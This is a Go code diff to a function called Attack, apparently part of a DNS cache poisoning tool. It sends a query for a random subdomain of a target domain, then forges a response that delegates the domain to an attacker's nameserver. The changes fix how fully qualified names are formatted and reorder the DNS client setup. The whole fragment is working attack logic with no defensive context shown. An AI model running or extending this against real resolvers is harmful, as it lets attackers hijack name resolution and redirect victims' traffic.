@@ -37,13 +37,15 @@ func Attack(
 		dnsPort         = 53
 	)
 
+	client := new(dns.Client)
+
 	// Generate random FQDN for target domain
-	randFQDN := fmt.Sprintf("%s.%s", RandAlphanumString(randResourceLen), targetDomain)
+	randFQDN := fmt.Sprintf("%s.%s.", RandAlphanumString(randResourceLen), targetDomain)
 	fmt.Printf("Will launch an attack by sending a request for %s\n", randFQDN)
 
 	// Create DNS query message
 	query := new(dns.Msg)
-	query.SetQuestion(dns.Fqdn(randFQDN), dns.TypeA)
+	query.SetQuestion(randFQDN, dns.TypeA)
 	query.Id = dns.Id()
 
 	// Create DNS response message
@@ -54,7 +56,7 @@ func Attack(
 	// Add answer section
 	response.Answer = append(response.Answer, &dns.A{
 		Hdr: dns.RR_Header{
-			Name:   dns.Fqdn(randFQDN),
+			Name:   randFQDN,
 			Rrtype: dns.TypeA,
 			Class:  dns.ClassINET,
 			Ttl:    0,
@@ -70,11 +72,10 @@ func Attack(
 			Class:  dns.ClassINET,
 			Ttl:    ttl,
 		},
-		Ns: attackerNS,
+		Ns: dns.Fqdn(attackerNS),
 	})
 
 	// Send initial query
-	client := new(dns.Client)
 	targetAddr := fmt.Sprintf("%s:%d", targetServerAddr.String(), dnsPort)
 	go client.Exchange(query, targetAddr)
 
